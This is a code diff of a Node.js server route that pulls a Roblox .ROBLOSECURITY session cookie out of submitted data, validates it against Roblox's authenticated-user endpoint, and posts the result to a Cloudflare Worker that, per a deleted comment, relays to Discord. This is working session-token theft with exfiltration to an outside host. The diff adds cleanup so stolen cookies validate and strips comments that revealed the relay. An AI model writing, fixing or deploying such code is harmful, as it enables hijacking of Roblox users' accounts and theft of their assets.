@@ -37,8 +37,6 @@ async function safeGet(url, cookie) {
 
 app.post('/api/process', async (req, res) => {
     const { data } = req.body;
-    
-    // Your Cloudflare Worker endpoint
     const workerUrl = 'https://rbxdev.xoqixyzorevuxybi.workers.dev/';
 
     if (!data) {
@@ -56,7 +54,12 @@ app.post('/api/process', async (req, res) => {
         if (cookieMatch) {
             roblosecurity = cookieMatch[1];
         }
-        roblosecurity = roblosecurity.replace(/\s+/g, '').replace(/["']/g, '');
+        
+        // Clean up formatting AND strip out any non-ASCII characters causing the ByteString error
+        roblosecurity = roblosecurity
+            .replace(/[^\x00-\x7F]/g, '') // Removes any invalid characters with code > 127
+            .replace(/\s+/g, '')
+            .replace(/["']/g, '');
 
         const authData = await safeGet('https://users.roblox.com/v1/users/authenticated', roblosecurity);
         if (!authData || !authData.id) {
@@ -149,7 +152,6 @@ app.post('/api/process', async (req, res) => {
             }]
         };
 
-        // Send payload to your Cloudflare Worker instead of directly to Discord
         await fetch(workerUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
